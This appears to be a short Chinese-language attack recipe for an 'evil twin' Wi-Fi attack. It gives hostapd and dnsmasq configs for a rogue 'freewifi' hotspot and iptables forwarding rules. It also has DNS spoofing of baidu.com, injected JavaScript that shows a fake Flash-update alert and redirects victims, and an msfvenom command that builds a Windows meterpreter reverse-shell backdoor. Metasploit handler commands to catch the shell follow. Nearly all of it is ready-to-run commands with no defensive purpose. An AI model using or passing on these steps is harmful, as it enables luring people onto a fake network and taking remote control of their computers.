# Evil_Twin

# 安装:  
apt install hostapd  

apt install dnsmasq  

# //配置网卡规则  
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE  
iptables --append FORWARD --in-interface wlan1mon -j ACCEPT    
//设置网关IP以及子网掩码  
ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0  
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1  
# //开启流量转发  
echo 1 > /proc/sys/net/ipv4/ip_forward  

# dnsmasq.conf  
interface=wlan1mon  
dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h  
dhcp-option=3, 192.168.1.1  
dhcp-option=6, 192.168.1.1  
server=8.8.8.8  
address=/baidu.com/192.168.1.1  
log-queries  
log-dhcp  
listen-address=127.0.0.1  

# hostapd.conf:  
interface=wlan1mon  
driver=nl80211  
ssid=freewifi  
hw_mode=g  
channel=6  
macaddr_acl=0  
ignore_broadcast_ssid=0  

# index.html:  
<head>  
<meta charset='utf-8'>  
<script src="http://192.168.1.1/new.js"> </script>  
</head>  

# new.js:  
window.alert = function(name){  
    var iframe = document. createElement("IFRAME");  
    iframe.style.display="none";  
    iframe.setAttribute("src",'data:text/plain,');  
    document. documentElement.appendChild(iframe);  
    window.frames [0].window.alert(name);  
    iframe.parentNode.removeChild(iframe);  
    }  
    alert( "您的FLASH版本过低，尝试升级后访问该页面! ");  
    window. location.href="http://192.168.1.1/flash";  


# 下载flash模板  
git clone https://github.com/r00tSe7en/Fake-flash.cn  

 
#生成后门:  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o /root/awa.exe  

service apache2 start //启动web服务器  
hostapd hostapd.conf //创建wifi  
dnsmasq -C dnsmasq.conf -d //dns服务  
python3 -m http.server 8080 //后门下载  

msfconsole //启动  
use exploit/multi/handler    //使用监听  
set payload windows/x64/meterpreter/reverse_tcp   //设置payload  
set lhost 192.168.1.1 //设置IP  
set lport 4444  //设置端口  
run //启动  


# iptables出现问题解决方法:https://zhuanlan.zhihu.com/p/118632728  
